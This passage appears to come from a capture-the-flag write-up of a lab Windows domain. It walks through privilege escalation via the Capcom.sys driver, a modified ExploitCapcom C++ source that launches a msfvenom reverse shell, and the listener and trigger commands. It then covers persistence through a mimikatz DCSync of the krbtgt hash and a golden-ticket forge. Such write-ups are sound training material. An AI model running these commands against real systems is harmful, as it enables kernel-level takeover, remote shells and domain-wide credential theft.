successfully:\nCompiling the ExploitCapcom exploit C++ project: We are going to be using the ExploitCapcom tool. We will need to compile this ourselves. The ExploitCapcom tool is the core component of our privilege escalation attack. It\u0026rsquo;s designed to exploit the vulnerability in the Capcom.sys driver that we\u0026rsquo;ve loaded using EopLoadDriver. This tool takes advantage of the driver\u0026rsquo;s ability to disable Supervisor Mode Execution Prevention (SMEP) and execute arbitrary code in kernel mode. By default, ExploitCapcom opens a new command prompt with SYSTEM privileges, but we\u0026rsquo;ll modify it to launch our custom payload instead. This tool effectively completes the privilege escalation chain, leveraging the loaded vulnerable driver to elevate our permissions to the highest level in the Windows operating system.\nImporting the ExploitCapcom C++ Project: This time I am going to clone this repo:\nPaste in the repo url:\nhttps://github.com/tandasat/ExploitCapcom.git Modifying ExploitCapcom exploit to enable a reverse shell: I open ExploitCapcom.cpp and do not remove the stdafx.h import:\nThe reason being is the actual required file containing the header is in this project. So we can compile with it. This exploit by default opens a new elevated shell, however this requires we have GUI access. So we will need to modify to run a reverse shell:\nBelow is the code we are going to modify:\nTCHAR CommandLine[] = TEXT(\u0026quot;C:\\\\Windows\\\\system32\\\\cmd.exe\u0026quot;); I will modify it to run a reverse shell generated via msfvenom:\n// Launches a command shell process static bool LaunchShell() { //Original Line Commented Out: //TCHAR CommandLine[] = TEXT(\u0026#34;C:\\\\Windows\\\\system32\\\\cmd.exe\u0026#34;); TCHAR CommandLine[] = TEXT(\u0026#34;C:\\\\Users\\\\svc-print\\\\Documents\\\\shell.exe\u0026#34;); PROCESS_INFORMATION ProcessInfo; STARTUPINFO StartupInfo = { sizeof(StartupInfo) }; if (!CreateProcess(CommandLine, CommandLine, nullptr, nullptr, FALSE, CREATE_NEW_CONSOLE, nullptr, nullptr, \u0026amp;StartupInfo, \u0026amp;ProcessInfo)) { return false; } CloseHandle(ProcessInfo.hThread); CloseHandle(ProcessInfo.hProcess); return true; } Full transparency, I tried multiple different payloads. My original plan was to upload nc64.exe but it just would not execute not matter the subshells etc I used. I compile it:\nGenerating our reverse-shell payload using msfvenom: I generate a simple reverse shell using msfvenom: msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.58 LPORT=443 -f exe -o shell.exe Run the exploit chain on the victim: I use evil-winrm to transfer all the files to the target:\nupload [filename] Load the driver Run Exploit:\n.\\EopLoadDriver.exe System\\CurrentControlSet\\Capcom C:\\Users\\svc-print\\Documents\\Capcom.sys All 0\u0026rsquo;s is good as a response, means we are working. Setup Listener:\nrlwrap -cAr nc -lnvp 443 Trigger exploit:\n.\\ExploitCapcom.exe Catch the reverse shell:\nGet our root flag:\n5. Persistence: Creating a Golden Ticket with mimikatz: I transfer mimikatz.exe over using my existing evil-winrm session:\nI perform a DCsync attack to retrieve the krbtgt NTLM hash:\nlsadump::dcsync /user:krbtgt /domain:fabricorp.local I also retrieve the domain SID I create my golden ticket using mimikatz \u0026amp; the krbtgt hash to make myself a 10 year ticket:\nkerberos::golden /domain:fabricorp.local /user:Administrator /sid:S-1-5-21-2633719317-1471316042-3957863514 /rc4:8ee7[REDACTED]87b0 I transfer the ticket back myself using evil-winrm:\nI convert the ticket so I can use it locally on linux:\nimpacket-ticketConverter ticket.kirbi admin.ccache I sync my clock with the target:\nsudo ntpdate -s fuse.$domain ",
